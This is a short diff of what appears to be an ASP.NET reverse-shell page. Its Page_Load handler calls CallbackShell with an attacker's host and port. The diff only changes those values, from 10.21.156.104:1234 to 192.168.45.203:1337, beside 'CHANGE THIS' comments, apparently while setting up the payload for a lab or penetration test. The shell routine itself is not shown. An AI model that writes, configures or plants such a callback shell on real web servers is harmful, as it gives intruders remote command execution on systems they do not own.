@@ -10,8 +10,8 @@
     
 	protected void Page_Load(object sender, EventArgs e)
     {
-	    String host = "10.21.156.104"; //CHANGE THIS
-            int port = 1234; ////CHANGE THIS
+	    String host = "192.168.45.203"; //CHANGE THIS
+            int port = 1337; ////CHANGE THIS
                 
         CallbackShell(host, port);
     }
